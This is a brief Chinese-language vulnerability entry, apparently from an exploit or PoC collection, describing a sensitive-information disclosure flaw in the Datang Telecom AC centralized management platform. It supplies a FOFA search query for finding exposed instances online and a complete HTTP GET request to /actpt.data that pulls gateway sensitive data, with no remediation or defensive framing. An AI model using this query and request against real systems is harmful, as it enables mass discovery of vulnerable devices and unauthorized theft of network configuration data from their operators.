## 大唐电信AC集中管理平台敏感信息泄漏漏洞

大唐电信科技股份有限公司是电信科学技术研究院（大唐电信科技产业集团）控股的的高科技企业，大唐电信已形成集成电路设计、软件与应用、终端设计、移动互联网四大产业板块。大唐电信AC集中管理平台存在敏感信息泄漏漏洞。攻击者利用此漏洞可获取大唐电信AC终端管理平台控制的网关敏感信息。

## fofa

```
app="大唐电信AC集中管理平台" && fid="gmqJFLGz7L/7TdQxUJFBXQ=="
```

## poc

```
GET /actpt.data HTTP/1.1
Host: xx.xx.xx.xx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072013575.png)